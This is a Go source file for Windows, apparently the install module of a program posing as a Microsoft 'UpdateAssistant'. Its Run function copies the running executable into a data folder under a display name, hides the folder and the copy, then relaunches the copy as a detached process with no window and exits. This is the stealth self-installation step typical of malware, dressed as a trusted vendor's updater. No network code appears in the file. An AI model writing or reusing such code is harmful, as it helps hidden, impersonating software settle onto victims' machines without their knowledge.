//go:build windows

package install

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

func installPath() string {
	return config.DataPath() + `\` + config.DisplayName() + `.exe`
}

func Run() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	target := installPath()

	if strings.EqualFold(filepath.Clean(exe), filepath.Clean(target)) {
		return
	}

	dir := filepath.Dir(target)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return
	}
	sysutil.HidePath(dir)

	data, err := os.ReadFile(exe)
	if err != nil {
		return
	}

	if err := os.WriteFile(target, data, 0o700); err != nil {
		return
	}
	sysutil.HidePath(target)

	if relaunch(target) == nil {
		os.Exit(0)
	}
}

func relaunch(path string) error {
	argv0, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	return syscall.CreateProcess(
		argv0,
		nil,
		nil,
		nil,
		false,
		syscall.CREATE_NEW_PROCESS_GROUP|0x00000008|0x08000000,
		nil,
		nil,
		&si,
		&pi,
	)
}
